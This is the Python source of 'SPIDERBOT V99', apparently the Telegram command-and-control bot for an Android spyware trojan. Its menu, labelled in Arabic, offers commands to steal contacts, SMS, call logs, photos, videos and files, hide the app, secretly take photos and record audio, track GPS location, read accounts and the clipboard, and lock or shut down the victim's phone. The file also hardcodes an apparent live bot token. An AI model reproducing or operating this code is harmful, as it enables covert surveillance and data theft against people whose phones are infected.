#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== الإعدادات ==========
BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M"
ADMIN_CHAT_ID = "6793813126"
DEVICES_FILE = "devices.json"

logging.basicConfig(level=logging.INFO)

# ========== إدارة الأجهزة ==========
def load_devices():
    if os.path.exists(DEVICES_FILE):
        with open(DEVICES_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_devices(data):
    with open(DEVICES_FILE, 'w') as f:
        json.dump(data, f, indent=4)

active_device = {}  # {user_id: device_id}
pending_auth = {}   # {user_id: device_id}

# ========== قائمة الأوامر ==========
COMMANDS = {
    "GET_CONTACTS": "📇 سرقة جهات الاتصال",
    "GET_SMS": "💬 سرقة الرسائل النصية",
    "GET_CALLLOGS": "📞 سرقة سجل المكالمات",
    "GET_LOCATION": "📍 تحديد الموقع GPS",
    "START_RECORD": "🎤 بدء تسجيل الصوت",
    "STOP_RECORD": "⏹ إيقاف التسجيل وإرسال الملف",
    "GET_APPS": "📱 قائمة التطبيقات المثبتة",
    "GET_PHOTOS": "🖼 سرقة جميع الصور",
    "GET_VIDEOS": "🎬 سرقة جميع الفيديوهات",
    "GET_FILES": "📦 سرقة جميع الملفات",
    "HIDE_APP": "👁 إخفاء التطبيق",
    "SHOW_APP": "👁 إظهار التطبيق",
    "FAKE_NOTIF": "🔔 إرسال إشعار وهمي",
    "TAKE_PHOTO": "📸 تصوير كاميرا خلفية",
    "TAKE_PHOTO_FRONT": "🤳 تصوير كاميرا أمامية (سيلفي)",
    "FLASH_ON": "🔦 تشغيل الكشاف",
    "FLASH_OFF": "🔦 إطفاء الكشاف",
    "GET_IMEI": "📟 رقم IMEI",
    "GET_PHONE": "📞 رقم الهاتف",
    "GET_SIM": "📡 معلومات الشريحة",
    "GET_WIFI": "📶 معلومات الواي فاي",
    "GET_BATTERY": "🔋 معلومات البطارية",
    "GET_IP": "🌐 عنوان IP العام",
    "START_LOCATION_TRACK": "📍 تتبع الموقع المستمر",
    "STOP_LOCATION_TRACK": "🛑 إيقاف تتبع الموقع",
    "GET_INSTALLED": "📦 التطبيقات المثبتة (أول 50)",
    "GET_PROCESSES": "🔄 العمليات الجارية",
    "LOCK_DEVICE": "🔒 قفل الجهاز",
    "REBOOT": "🔄 إعادة تشغيل الجهاز",
    "SHUTDOWN": "⏻ إيقاف تشغيل الجهاز",
    "GET_ACCOUNTS": "👤 حسابات Google المسجلة",
    "GET_CLIPBOARD": "📋 محتوى الحافظة",
}

# ========== دوال البوت ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("📱 عرض الأجهزة", callback_data="devices")],
        [InlineKeyboardButton("📋 قائمة الأوامر", callback_data="commands")],
        [InlineKeyboardButton("❓ المساعدة", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🕷️ **SPIDERBOT V99** 🕷️\n\n"
        f"مرحباً {user.first_name}!\n"
        f"بوت التحكم عن بعد - جاهز للاستخدام.\n\n"
        f"اختر أحد الخيارات أدناه:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "devices":
        await show_devices(update, context)
    elif data == "commands":
        await show_commands(update, context)
    elif data == "help":
        await show_help(update, context)
    elif data.startswith("select_"):
        device_id = data.replace("select_", "")
        await select_device(update, context, device_id)
    elif data.startswith("cmd_"):
        command = data.replace("cmd_", "")
        await send_command(update, context, command)

async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices = load_devices()
    if not devices:
        await update.callback_query.edit_message_text("❌ لا توجد أجهزة مسجلة حالياً.")
        return

    keyboard = []
    for dev_id, info in devices.items():
        name = info.get("device_name", info.get("model", "Unknown"))
        keyboard.append([InlineKeyboardButton(f"📱 {name}", callback_data=f"select_{dev_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        "📱 **اختر الجهاز الذي تريد التحكم به:**",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def select_device(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
    devices = load_devices()
    if device_id not in devices:
        await update.callback_query.edit_message_text("❌ الجهاز غير موجود.")
        return

    user_id = update.effective_user.id
    active_device[user_id] = device_id
    device_name = devices[device_id].get("device_name", devices[device_id].get("model", "Unknown"))

    # عرض قائمة الأوامر بعد الاختيار
    await show_commands(update, context, device_name)

async def show_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, device_name: str = None):
    user_id = update.effective_user.id
    if user_id not in active_device:
        await update.callback_query.edit_message_text(
            "⚠️ **لم تختر جهازاً بعد!**\n"
            "استخدم زر 'عرض الأجهزة' أولاً."
        )
        return

    if not device_name:
        devices = load_devices()
        dev_id = active_device[user_id]
        device_name = devices.get(dev_id, {}).get("device_name", devices.get(dev_id, {}).get("model", "Unknown"))

    # بناء لوحة الأوامر (صفين كل زر)
    keyboard = []
    row = []
    for i, (cmd, label) in enumerate(COMMANDS.items()):
        row.append(InlineKeyboardButton(label, callback_data=f"cmd_{cmd}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    # إضافة أزرار إضافية
    keyboard.append([InlineKeyboardButton("🔄 تحديث الأجهزة", callback_data="devices")])
    keyboard.append([InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="help")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"🕷️ **SPIDERBOT V99** 🕷️\n"
        f"📱 الجهاز المحدد: **{device_name}**\n\n"
        f"📋 **اختر الأمر الذي تريد تنفيذه:**",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE, command: str):
    user_id = update.effective_user.id
    if user_id not in active_device:
        await update.callback_query.answer("⚠️ لم تختر جهازاً!")
        return

    device_id = active_device[user_id]
    devices = load_devices()
    if device_id not in devices:
        await update.callback_query.answer("❌ الجهاز غير موجود!")
        return

    # إرسال الأمر إلى الجهاز عبر الرسائل المباشرة
    chat_id = devices[device_id].get("chat_id")
    if not chat_id:
        await update.callback_query.edit_message_text(
            "❌ **الجهاز غير متصل حالياً.**\n"
            "تأكد من أن التطبيق يعمل على الجهاز المستهدف."
        )
        return

    try:
        await context.bot.send_message(chat_id=chat_id, text=f"CMD:{command}")
        await update.callback_query.edit_message_text(
            f"✅ **تم إرسال الأمر:**\n"
            f"`{command}`\n"
            f"📱 إلى: {devices[device_id].get('device_name', device_id)}\n\n"
            f"⏳ انتظر الرد من الجهاز..."
        )
    except Exception as e:
        await update.callback_query.edit_message_text(f"❌ فشل الإرسال: {e}")

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🕷️ **SPIDERBOT V99 - المساعدة** 🕷️\n\n"
        "📌 **كيفية الاستخدام:**\n"
        "1. اضغط على 'عرض الأجهزة' لرؤية الأجهزة المسجلة.\n"
        "2. اختر جهازاً من القائمة.\n"
        "3. اختر الأمر الذي تريد تنفيذه من القائمة.\n\n"
        "📋 **الأوامر المتاحة:**\n"
        + "\n".join([f"• {label} → `{cmd}`" for cmd, label in COMMANDS.items()]) +
        "\n\n🔒 **ملاحظة:** جميع الأوامر تُرسل مشفرة ولا تُخزن."
    )
    keyboard = [[InlineKeyboardButton("📱 عرض الأجهزة", callback_data="devices")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        help_text,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ========== استقبال تسجيل الأجهزة ==========
async def handle_device_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message or not message.text:
        return

    text = message.text
    if text.startswith("REGISTER:"):
        try:
            data = text.replace("REGISTER:", "").strip()
            # تنسيق: REGISTER:{"device_id":"xxx","model":"xxx",...}
            import json
            info = json.loads(data)
            device_id = info.get("device_id")
            if device_id:
                devices = load_devices()
                devices[device_id] = {
                    "device_name": info.get("device_name", info.get("model", "Unknown")),
                    "model": info.get("model", "Unknown"),
                    "manufacturer": info.get("manufacturer", "Unknown"),
                    "android": info.get("android", "Unknown"),
                    "battery": info.get("battery", "0"),
                    "chat_id": message.chat_id,
                    "last_seen": str(message.date)
                }
                save_devices(devices)

                # إرسال تأكيد للمدير
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"✅ **جهاز جديد مسجل!**\n"
                         f"📱 {info.get('device_name', info.get('model', 'Unknown'))}\n"
                         f"🆔 `{device_id}`\n"
                         f"🤖 أندرويد: {info.get('android', 'Unknown')}\n"
                         f"🔋 البطارية: {info.get('battery', '0')}%"
                )
        except Exception as e:
            logging.error(f"Registration error: {e}")

# ========== التشغيل ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_message))

    print("🕷️ SpiderBot V99 is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
